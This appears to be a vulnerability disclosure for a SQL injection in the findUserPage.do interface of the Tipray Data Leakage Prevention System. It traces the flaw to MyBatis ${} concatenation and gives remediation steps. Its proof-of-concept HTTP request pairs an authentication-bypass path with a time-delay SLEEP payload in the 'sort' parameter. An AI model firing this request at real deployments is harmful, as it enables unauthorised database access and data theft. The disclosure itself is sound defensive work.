# SQL Injection Vulnerability in the findUserPage.do Interface of Tipray Data Leakage Prevention System

## 1. Basic Information
Tipray Data Leakage Prevention System is an intelligent approval platform focusing on enterprise data security and compliance management. It deeply integrates document encryption, permission control, and process automation, providing enterprises with full-lifecycle security management and control for files from creation and circulation to archiving.

The official website of the company developing this system is https://www.tipray.com/index.php


## 2. Vulnerability Analysis
### 2.1 Sink Point Identification
We identified a sink point in the `com.trwfe.controller.UserController#findUserPage` method. As analyzed in previous reports, the `PageVo` class used here is insecure, and its parameters are **user-controllable** (external users can manipulate the parameter values freely).

<img width="1580" height="435" alt="image" src="https://github.com/user-attachments/assets/212c9f58-a7f3-49fa-a2c4-b6abe2eadcea" />


### 2.2 Tracing the `findAllUserPage` Method
To further confirm the vulnerability chain, we traced the `findAllUserPage` method invoked at the sink point. This method directly uses the parameters of `PageVo` without implementing effective filtering or sanitization measures, which paves the way for subsequent SQL injection.

<img width="2095" height="1126" alt="image" src="https://github.com/user-attachments/assets/fba97bce-f722-4fd6-a0e8-4ba87c4a2bf8" />


### 2.3 Mapper Layer Verification
We continued to track the data flow down to the **mapper layer** (the component responsible for interacting with the database). It was discovered that the user-controllable parameters from `PageVo` are directly concatenated into SQL statements using the `${}` syntax—instead of MyBatis’ secure `#{} `syntax for parameter binding. This direct concatenation is the root cause of the SQL injection vulnerability.

<img width="1983" height="695" alt="image" src="https://github.com/user-attachments/assets/049ec0c3-3539-47f7-bd4f-c2654ad76d66" />


## 3. Proof of Concept (PoC)
Based on the above analysis, we constructed the following HTTP request as a PoC to verify the SQL injection vulnerability. This PoC leverages **time-delay injection** (via the `SLEEP(4)` function): if the request returns after a 4-second delay, the existence of the vulnerability is confirmed.

```http
POST http://ip/trwfe/login.jsp/..;/user/findUserPage.do HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: JSESSIONID=BBE157F1DBA868496A6CB76724EA3D28
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

sort=1+AND+(SELECT+8234+FROM+(SELECT+SLEEP(4))test)
```


## 4. Verification Result
After sending the PoC request, the server responded with a **4-second delay**. This fully confirms that the user-controlled `sort` parameter is injected into the SQL statement and executed successfully. Therefore, the `findUserPage.do` interface of Tipray Data Leakage Prevention System contains a high-risk SQL injection vulnerability.

<img width="1890" height="819" alt="image" src="https://github.com/user-attachments/assets/a73a685a-ce6d-4fd3-8d9d-00856a994392" />


## 5. Risk Level
- **High Risk**  
  SQL injection vulnerabilities enable attackers to execute arbitrary SQL statements (e.g., querying sensitive data such as user credentials, deleting database tables, or modifying business-critical data), which may result in severe data leakage or system outages. Additionally, the system’s existing authentication bypass vulnerability (mentioned in previous reports) allows attackers to access the `findUserPage.do` interface without authorization, further expanding the attack surface.


## 6. Remediation Suggestions
1. **Replace `${}` with `#{} `in MyBatis Mappers**  
   Modify the SQL mapping logic in the mapper file: replace the insecure `${sort}` syntax with `#{sort}`. MyBatis’ `#{} `syntax automatically performs parameter escaping, preventing user input from being directly concatenated into SQL statements.

2. **Strengthen Parameter Validation**  
   Implement strict validation for user-controllable parameters (e.g., `sort`). Restrict parameter values to pre-defined legal options (e.g., only allow `id ASC` or `create_time DESC`), and reject any input containing special characters (e.g., `AND`, `OR`, `SLEEP()`) that could be used for injection attacks.

3. **Fix the Authentication Bypass Vulnerability**  
   Repair the URL parsing logic in `SecurityFilter#doFilter` and `SessionFilter.isNoNeedValidate` to block bypass techniques like `/login.jsp/..;/xxx`. Ensure all sensitive interfaces (including `findUserPage.do`) can only be accessed after successful authentication.

4. **Enable SQL Injection Detection**  
   Deploy a Web Application Firewall (WAF) or enable built-in SQL injection detection mechanisms to monitor and block malicious injection requests in real time.


Thank you for your review. Wish you a pleasant day!
